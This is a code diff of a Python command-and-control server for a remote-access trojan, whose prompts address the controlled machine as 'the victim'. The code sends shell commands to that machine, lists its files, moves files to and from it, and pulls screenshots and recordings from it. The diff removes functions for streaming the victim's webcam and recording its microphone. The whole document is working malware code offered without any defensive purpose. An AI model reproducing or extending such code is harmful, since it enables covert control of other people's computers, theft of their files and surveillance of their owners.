@@ -1,7 +1,5 @@
 import socket
 import threading
-import cv2
-import numpy as np
 
 
 class Server:
@@ -26,13 +24,10 @@ class Server:
         self.startListen()
         self.server()
 
-    def receive_file_from_client(self, auto_saving):
-        if auto_saving:
-            file_path = "C:\\C projects\\CMD_Text.txt"
+    def receive_file_from_client(self):
 
-        else:
-            # Take from the victim file
-            file_path = input("Where do you want save the file?\n")
+        # Take from the victim file
+        file_path = input("Where do you want save the file?\n")
 
         with open(file_path, 'wb')as f:
             print('Open File')
@@ -45,6 +40,7 @@ class Server:
                     f.close()
                     break
                 f.write(data)
+        print('done')
 
     def send_file_to_client(self, data):
         # Send to the victim files
@@ -59,34 +55,6 @@ class Server:
                 f.close()
                 break
 
-    def capture_camera(self):
-
-        # Receiving 5 every time because its the length of the encoded image
-        data_size = self.server_socket.recv(5).decode()
-
-        # If the camera of the client isn't connected
-        if data_size.startswith("$$$$$"):
-            print("The camera of the client is not connected")
-            return
-
-        while True:
-            print(data_size)
-            if data_size.startswith("#####"):
-                print("Got exception on the client")
-                cv2.destroyWindow(self.client_name + "camera")
-                return
-
-            data = self.server_socket.recv(int(data_size))
-
-            data = np.asarray(bytearray(data), dtype="uint8")
-            image = cv2.imdecode(data, cv2.IMREAD_COLOR)
-
-            cv2.imshow(self.client_name + "camera", image)
-            cv2.waitKey(1)
-            data_size = self.server_socket.recv(5).decode()
-
-        cv2.destroyWindow(self.client_name + "camera")
-
     def server(self):
         print("Connection from: " + str(self.adress))
 
@@ -95,14 +63,23 @@ class Server:
             command = input('Please enter a command to the victim\n')
             self.server_socket.send(command.encode('utf-8'))
 
-            if command.startswith('get file '):
-                self.receive_file_from_client(False)
+            # recv file (file name on victim computer)
+            if command.startswith('recv file'):
+                self.receive_file_from_client()
 
-
+            # for sending mcd commands to victim computer
             elif command.startswith("cmd"):
-                data = self.server_socket.recv(1024)
-                print(data.decode())
+                data = self.server_socket.recv(2048)
+                print(data.decode('utf-8', 'ignore'))
 
+
+            elif command.startswith("get files"):
+                data = self.server_socket.recv(20)
+                try:
+                    data = self.server_socket.recv(int(data.decode()))
+                    print(data.decode())
+                except:
+                    print(data)
 
 
             elif command.startswith('download file '):
@@ -115,28 +92,25 @@ class Server:
                 self.server_socket.sendall(command.encode('utf-8'))
                 path = input("Where do you want save the file on victim computer\n")
                 self.server_socket.sendall(path.encode('utf-8'))
-                self.receive_file_from_client(False)
+                self.receive_file_from_client()
 
             elif command.startswith('take screenshot '):
-                self.receive_file_from_client(False)
-
+                self.receive_file_from_client()
 
             elif command == 'exit':
                 break
 
             elif command.startswith('listen'):
-                self.receive_file_from_client(False)
-
-            elif command.startswith('take mic output'):
-                self.receive_file_from_client(False)
-
-            elif command.startswith("take camera video"):
-                self.capture_camera()
-                continue
+                self.receive_file_from_client()
 
             elif command == 'exit':
                 self.server_socket.close()
                 break
+
+            elif command == 'q':
+                print("quitting")
+                self.server_socket.close()
+                return
 
             else:
                 data = self.server_socket.recv(1024).decode('utf-8')
